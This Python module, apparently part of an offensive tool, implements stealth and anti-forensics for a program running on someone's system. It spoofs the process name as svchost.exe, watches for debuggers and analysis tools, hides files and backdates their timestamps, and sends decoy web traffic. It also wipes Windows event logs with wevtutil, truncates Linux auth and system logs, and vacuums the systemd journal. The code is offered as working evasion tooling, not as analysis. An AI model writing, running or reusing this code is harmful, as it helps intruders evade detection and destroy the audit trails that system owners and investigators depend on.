"""
Stealth Techniques Module
Advanced stealth and operational security techniques
"""

import os
import sys
import time
import random
import psutil
import threading
import subprocess
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from pathlib import Path
import tempfile
import shutil

from core.utils import NetworkUtils, CryptoUtils
from core.logger import logger


@dataclass
class StealthConfig:
    """Configuration for stealth operations"""
    # Process stealth
    enable_process_hiding: bool = True
    fake_process_name: str = "svchost.exe"
    process_priority: str = "normal"  # low, normal, high
    
    # Memory stealth
    enable_memory_protection: bool = True
    clear_memory_on_exit: bool = True
    encrypt_memory_data: bool = True
    
    # File stealth
    enable_file_hiding: bool = True
    use_temp_files: bool = True
    delete_traces: bool = True
    
    # Network stealth
    enable_traffic_obfuscation: bool = True
    randomize_timing: bool = True
    use_decoy_traffic: bool = True
    
    # System stealth
    disable_logging: bool = True
    clear_event_logs: bool = False  # Dangerous - may be detected
    modify_timestamps: bool = True
    
    # Anti-forensics
    enable_anti_forensics: bool = True
    overwrite_deleted_files: bool = True
    clear_registry_traces: bool = True
    
    # Persistence evasion
    avoid_persistence: bool = True
    run_from_memory: bool = False
    use_living_off_land: bool = True


class ProcessStealth:
    """Cross-platform process-level stealth techniques"""
    
    def __init__(self, config: StealthConfig):
        self.config = config
        self.original_process_name = None
        self.process_monitor_thread = None
        self.is_monitoring = False
    
    def enable_process_stealth(self):
        """Enable cross-platform process stealth techniques"""
        if not self.config.enable_process_hiding:
            return
        
        logger.debug("Enabling process stealth...")
        
        # Change process name (platform-specific)
        self._change_process_name()
        
        # Set process priority
        self._set_process_priority()
        
        # Start process monitoring
        self._start_process_monitoring()
    
    def _change_process_name(self):
        """Change process name to blend in with cross-platform support"""
        try:
            self.original_process_name = sys.argv[0]
            
            if os.name == 'nt':  # Windows
                import ctypes
                from ctypes import wintypes
                
                # Get current process handle
                kernel32 = ctypes.windll.kernel32
                process_handle = kernel32.GetCurrentProcess()
                
                # This is a simplified approach - full implementation would
                # require more advanced techniques
                logger.debug(f"Process name change attempted on Windows: {self.config.fake_process_name}")
                
            else:  # Linux/Unix
                try:
                    # On Linux, we can modify the process name using prctl
                    import ctypes
                    import ctypes.util
                    
                    # Load libc
                    libc = ctypes.CDLL(ctypes.util.find_library('c'))
                    
                    # PR_SET_NAME = 15
                    PR_SET_NAME = 15
                    
                    # Set process name (limited to 16 characters on Linux)
                    fake_name = self.config.fake_process_name[:15].encode('utf-8')
                    result = libc.prctl(PR_SET_NAME, fake_name, 0, 0, 0)
                    
                    if result == 0:
                        logger.debug(f"Process name changed to: {fake_name.decode()}")
                    else:
                        logger.warning("Failed to change process name on Linux")
                        
                except Exception as e:
                    logger.debug(f"Linux process name change failed: {e}")
                    # Fallback: modify sys.argv[0]
                    try:
                        sys.argv[0] = self.config.fake_process_name
                        logger.debug(f"Process argv[0] changed to: {self.config.fake_process_name}")
                    except Exception as fallback_e:
                        logger.debug(f"Process name fallback failed: {fallback_e}")
                        
        except Exception as e:
            logger.debug(f"Process name change failed: {e}")
    
    def _set_process_priority(self):
        """Set process priority to avoid detection"""
        try:
            current_process = psutil.Process()
            
            if self.config.process_priority == "low":
                current_process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
            elif self.config.process_priority == "high":
                current_process.nice(psutil.HIGH_PRIORITY_CLASS)
            else:
                current_process.nice(psutil.NORMAL_PRIORITY_CLASS)
                
            logger.debug(f"Process priority set to {self.config.process_priority}")
            
        except Exception as e:
            logger.debug(f"Failed to set process priority: {e}")
    
    def _start_process_monitoring(self):
        """Start monitoring for process analysis tools"""
        if self.is_monitoring:
            return
        
        self.is_monitoring = True
        self.process_monitor_thread = threading.Thread(
            target=self._monitor_processes,
            daemon=True
        )
        self.process_monitor_thread.start()
    
    def _monitor_processes(self):
        """Monitor for analysis tools and debuggers"""
        suspicious_processes = [
            'procmon.exe', 'procexp.exe', 'taskmgr.exe',
            'perfmon.exe', 'resmon.exe', 'windbg.exe',
            'x64dbg.exe', 'ollydbg.exe', 'ida.exe',
            'wireshark.exe', 'fiddler.exe', 'tcpview.exe',
            'autoruns.exe', 'regmon.exe', 'filemon.exe'
        ]
        
        while self.is_monitoring:
            try:
                for proc in psutil.process_iter(['pid', 'name']):
                    proc_name = proc.info['name'].lower()
                    
                    if proc_name in suspicious_processes:
                        logger.warning(f"Detected analysis tool: {proc_name}")
                        # Could implement evasive actions here
                        
            except Exception as e:
                logger.debug(f"Process monitoring error: {e}")
            
            time.sleep(5)  # Check every 5 seconds
    
    def disable_process_stealth(self):
        """Disable process stealth"""
        self.is_monitoring = False
        
        if self.process_monitor_thread:
            self.process_monitor_thread.join(timeout=1)


class MemoryStealth:
    """Memory-level stealth techniques"""
    
    def __init__(self, config: StealthConfig):
        self.config = config
        self.encrypted_data = {}
        self.memory_key = None
    
    def enable_memory_protection(self):
        """Enable memory protection techniques"""
        if not self.config.enable_memory_protection:
            return
        
        logger.debug("Enabling memory protection...")
        
        # Generate memory encryption key
        if self.config.encrypt_memory_data:
            self.memory_key = CryptoUtils.generate_key()
        
        # Set up memory clearing on exit
        if self.config.clear_memory_on_exit:
            import atexit
            atexit.register(self.clear_sensitive_memory)
    
    def store_sensitive_data(self, key: str, data: Any) -> str:
        """Store sensitive data in encrypted memory"""
        if not self.config.encrypt_memory_data or not self.memory_key:
            return str(data)
        
        try:
            # Encrypt data
            encrypted = CryptoUtils.encrypt_data(str(data), self.memory_key)
            storage_key = CryptoUtils.generate_random_string(16)
            self.encrypted_data[storage_key] = encrypted
            
            return storage_key
            
        except Exception as e:
            logger.debug(f"Failed to encrypt memory data: {e}")
            return str(data)
    
    def retrieve_sensitive_data(self, storage_key: str) -> Optional[str]:
        """Retrieve sensitive data from encrypted memory"""
        if storage_key not in self.encrypted_data:
            return storage_key  # Return as-is if not encrypted
        
        try:
            encrypted_data = self.encrypted_data[storage_key]
            decrypted = CryptoUtils.decrypt_data(encrypted_data, self.memory_key)
            return decrypted
            
        except Exception as e:
            logger.debug(f"Failed to decrypt memory data: {e}")
            return None
    
    def clear_sensitive_memory(self):
        """Clear sensitive data from memory"""
        logger.debug("Clearing sensitive memory...")
        
        # Clear encrypted data
        self.encrypted_data.clear()
        
        # Overwrite memory key
        if self.memory_key:
            self.memory_key = b'\x00' * len(self.memory_key)
        
        # Force garbage collection
        import gc
        gc.collect()


class FileStealth:
    """File-level stealth techniques"""
    
    def __init__(self, config: StealthConfig):
        self.config = config
        self.temp_files = []
        self.original_files = []
    
    def create_stealth_file(self, content: bytes, extension: str = ".tmp") -> str:
        """Create a stealth file"""
        if self.config.use_temp_files:
            return self._create_temp_file(content, extension)
        else:
            return self._create_hidden_file(content, extension)
    
    def _create_temp_file(self, content: bytes, extension: str) -> str:
        """Create temporary file"""
        try:
            with tempfile.NamedTemporaryFile(
                suffix=extension,
                delete=False
            ) as temp_file:
                temp_file.write(content)
                temp_path = temp_file.name
            
            self.temp_files.append(temp_path)
            
            # Modify timestamps to blend in
            if self.config.modify_timestamps:
                self._modify_file_timestamps(temp_path)
            
            return temp_path
            
        except Exception as e:
            logger.debug(f"Failed to create temp file: {e}")
            return ""
    
    def _create_hidden_file(self, content: bytes, extension: str) -> str:
        """Create hidden file with cross-platform support"""
        try:
            # Create in system temp directory with random name
            temp_dir = tempfile.gettempdir()
            filename = CryptoUtils.generate_random_string(8) + extension
            file_path = os.path.join(temp_dir, filename)
            
            with open(file_path, 'wb') as f:
                f.write(content)
            
            # Hide file (platform-specific)
            if os.name == 'nt':  # Windows
                try:
                    import ctypes
                    ctypes.windll.kernel32.SetFileAttributesW(
                        file_path, 0x02  # FILE_ATTRIBUTE_HIDDEN
                    )
                    logger.debug(f"File hidden on Windows: {file_path}")
                except Exception as e:
                    logger.debug(f"Failed to hide file on Windows: {e}")
            else:  # Linux/Unix
                try:
                    # On Linux, create file with dot prefix to make it hidden
                    hidden_filename = "." + filename
                    hidden_path = os.path.join(temp_dir, hidden_filename)
                    
                    # Move the file to hidden name
                    shutil.move(file_path, hidden_path)
                    file_path = hidden_path
                    
                    # Set restrictive permissions (owner read/write only)
                    os.chmod(file_path, 0o600)
                    logger.debug(f"File hidden on Linux: {file_path}")
                    
                except Exception as e:
                    logger.debug(f"Failed to hide file on Linux: {e}")
            
            self.temp_files.append(file_path)
            return file_path
            
        except Exception as e:
            logger.debug(f"Failed to create hidden file: {e}")
            return ""
    
    def _modify_file_timestamps(self, file_path: str):
        """Modify file timestamps to avoid detection"""
        try:
            # Set timestamps to blend with system files
            system_time = time.time() - random.randint(86400, 2592000)  # 1-30 days ago
            os.utime(file_path, (system_time, system_time))
            
        except Exception as e:
            logger.debug(f"Failed to modify timestamps: {e}")
    
    def secure_delete_file(self, file_path: str):
        """Securely delete file with overwriting"""
        if not os.path.exists(file_path):
            return
        
        try:
            if self.config.overwrite_deleted_files:
                # Overwrite file multiple times
                file_size = os.path.getsize(file_path)
                
                with open(file_path, 'r+b') as f:
                    for _ in range(3):  # 3 passes
                        f.seek(0)
                        f.write(os.urandom(file_size))
                        f.flush()
                        os.fsync(f.fileno())
            
            # Delete file
            os.remove(file_path)
            
        except Exception as e:
            logger.debug(f"Failed to securely delete file: {e}")
    
    def cleanup_files(self):
        """Clean up all temporary files"""
        logger.debug("Cleaning up stealth files...")
        
        for file_path in self.temp_files:
            self.secure_delete_file(file_path)
        
        self.temp_files.clear()


class NetworkStealth:
    """Network-level stealth techniques"""
    
    def __init__(self, config: StealthConfig):
        self.config = config
        self.decoy_thread = None
        self.is_generating_decoys = False
    
    def enable_network_stealth(self):
        """Enable network stealth techniques"""
        if not self.config.enable_traffic_obfuscation:
            return
        
        logger.debug("Enabling network stealth...")
        
        # Start decoy traffic generation
        if self.config.use_decoy_traffic:
            self._start_decoy_traffic()
    
    def _start_decoy_traffic(self):
        """Start generating decoy network traffic"""
        if self.is_generating_decoys:
            return
        
        self.is_generating_decoys = True
        self.decoy_thread = threading.Thread(
            target=self._generate_decoy_traffic,
            daemon=True
        )
        self.decoy_thread.start()
    
    def _generate_decoy_traffic(self):
        """Generate decoy network traffic"""
        decoy_targets = [
            'google.com', 'microsoft.com', 'amazon.com',
            'cloudflare.com', 'github.com', 'stackoverflow.com'
        ]
        
        while self.is_generating_decoys:
            try:
                target = random.choice(decoy_targets)
                
                # Generate random HTTP request
                import urllib.request
                import urllib.error
                
                try:
                    with urllib.request.urlopen(
                        f'http://{target}',
                        timeout=5
                    ) as response:
                        # Read small amount of data
                        response.read(1024)
                        
                except urllib.error.URLError:
                    pass  # Expected for some requests
                
                # Random delay between requests
                delay = random.uniform(10, 60)  # 10-60 seconds
                time.sleep(delay)
                
            except Exception as e:
                logger.debug(f"Decoy traffic error: {e}")
                time.sleep(30)
    
    def add_timing_jitter(self, base_delay: float) -> float:
        """Add random jitter to timing"""
        if not self.config.randomize_timing:
            return base_delay
        
        # Add ±20% jitter
        jitter = base_delay * 0.2 * (random.random() - 0.5) * 2
        return max(0.001, base_delay + jitter)
    
    def disable_network_stealth(self):
        """Disable network stealth"""
        self.is_generating_decoys = False
        
        if self.decoy_thread:
            self.decoy_thread.join(timeout=1)


class SystemStealth:
    """Cross-platform system-level stealth techniques"""
    
    def __init__(self, config: StealthConfig):
        self.config = config
        self.original_log_level = None
    
    def enable_system_stealth(self):
        """Enable cross-platform system-level stealth"""
        logger.debug("Enabling system stealth...")
        
        # Disable logging if configured
        if self.config.disable_logging:
            self._disable_system_logging()
        
        # Clear event logs (dangerous - may be detected)
        if self.config.clear_event_logs:
            self._clear_event_logs()
    
    def _disable_system_logging(self):
        """Disable system logging"""
        try:
            # Reduce logging level
            import logging
            self.original_log_level = logging.getLogger().level
            logging.getLogger().setLevel(logging.CRITICAL)
            
        except Exception as e:
            logger.debug(f"Failed to disable logging: {e}")
    
    def _clear_event_logs(self):
        """Clear system event logs with cross-platform support (DANGEROUS)"""
        try:
            if os.name == 'nt':  # Windows
                # This is extremely suspicious and likely to be detected
                # Only use in controlled environments
                
                log_names = ['Application', 'System', 'Security']
                
                for log_name in log_names:
                    try:
                        subprocess.run([
                            'wevtutil', 'cl', log_name
                        ], check=True, capture_output=True, timeout=10)
                        logger.debug(f"Cleared Windows event log: {log_name}")
                        
                    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
                        logger.debug(f"Failed to clear Windows event log: {log_name}")
                        
            else:  # Linux/Unix
                # Clear common Linux log files (EXTREMELY DANGEROUS)
                # This will likely be detected by system administrators
                
                log_files = [
                    '/var/log/auth.log',
                    '/var/log/syslog',
                    '/var/log/messages',
                    '/var/log/secure',
                    '/var/log/kern.log',
                    '/var/log/daemon.log'
                ]
                
                for log_file in log_files:
                    try:
                        if os.path.exists(log_file) and os.access(log_file, os.W_OK):
                            # Truncate log file instead of deleting (less suspicious)
                            with open(log_file, 'w') as f:
                                f.truncate(0)
                            logger.debug(f"Truncated Linux log file: {log_file}")
                        else:
                            logger.debug(f"Cannot access Linux log file: {log_file}")
                            
                    except Exception as e:
                        logger.debug(f"Failed to clear Linux log file {log_file}: {e}")
                
                # Clear systemd journal (if available)
                try:
                    subprocess.run([
                        'journalctl', '--vacuum-time=1s'
                    ], check=True, capture_output=True, timeout=10)
                    logger.debug("Cleared systemd journal")
                    
                except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
                    logger.debug("Failed to clear systemd journal")
                    
        except Exception as e:
            logger.debug(f"Failed to clear event logs: {e}")
                    
        except Exception as e:
            logger.debug(f"Failed to clear event logs: {e}")
    
    def restore_system_state(self):
        """Restore original system state"""
        if self.original_log_level is not None:
            import logging
            logging.getLogger().setLevel(self.original_log_level)


class StealthManager:
    """Main stealth operations manager"""
    
    def __init__(self, config: StealthConfig = None):
        self.config = config or StealthConfig()
        
        self.process_stealth = ProcessStealth(self.config)
        self.memory_stealth = MemoryStealth(self.config)
        self.file_stealth = FileStealth(self.config)
        self.network_stealth = NetworkStealth(self.config)
        self.system_stealth = SystemStealth(self.config)
        
        self.is_stealth_enabled = False
    
    def enable_full_stealth(self):
        """Enable all stealth techniques"""
        if self.is_stealth_enabled:
            return
        
        logger.info("Enabling full stealth mode...")
        
        try:
            self.process_stealth.enable_process_stealth()
            self.memory_stealth.enable_memory_protection()
            self.network_stealth.enable_network_stealth()
            self.system_stealth.enable_system_stealth()
            
            self.is_stealth_enabled = True
            logger.info("Full stealth mode enabled")
            
        except Exception as e:
            logger.error(f"Failed to enable stealth mode: {e}")
    
    def disable_stealth(self):
        """Disable all stealth techniques"""
        if not self.is_stealth_enabled:
            return
        
        logger.info("Disabling stealth mode...")
        
        try:
            self.process_stealth.disable_process_stealth()
            self.network_stealth.disable_network_stealth()
            self.system_stealth.restore_system_state()
            self.file_stealth.cleanup_files()
            self.memory_stealth.clear_sensitive_memory()
            
            self.is_stealth_enabled = False
            logger.info("Stealth mode disabled")
            
        except Exception as e:
            logger.error(f"Failed to disable stealth mode: {e}")
    
    def create_stealth_file(self, content: bytes, extension: str = ".tmp") -> str:
        """Create stealth file"""
        return self.file_stealth.create_stealth_file(content, extension)
    
    def store_sensitive_data(self, key: str, data: Any) -> str:
        """Store sensitive data securely"""
        return self.memory_stealth.store_sensitive_data(key, data)
    
    def retrieve_sensitive_data(self, storage_key: str) -> Optional[str]:
        """Retrieve sensitive data"""
        return self.memory_stealth.retrieve_sensitive_data(storage_key)
    
    def add_network_jitter(self, base_delay: float) -> float:
        """Add network timing jitter"""
        return self.network_stealth.add_timing_jitter(base_delay)
    
    def get_stealth_status(self) -> Dict[str, Any]:
        """Get current stealth status"""
        return {
            'stealth_enabled': self.is_stealth_enabled,
            'process_stealth': self.config.enable_process_hiding,
            'memory_protection': self.config.enable_memory_protection,
            'file_hiding': self.config.enable_file_hiding,
            'network_obfuscation': self.config.enable_traffic_obfuscation,
            'anti_forensics': self.config.enable_anti_forensics,
            'temp_files_count': len(self.file_stealth.temp_files),
            'encrypted_data_count': len(self.memory_stealth.encrypted_data)
        }
    
    def __enter__(self):
        """Context manager entry"""
        self.enable_full_stealth()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit"""
        self.disable_stealth()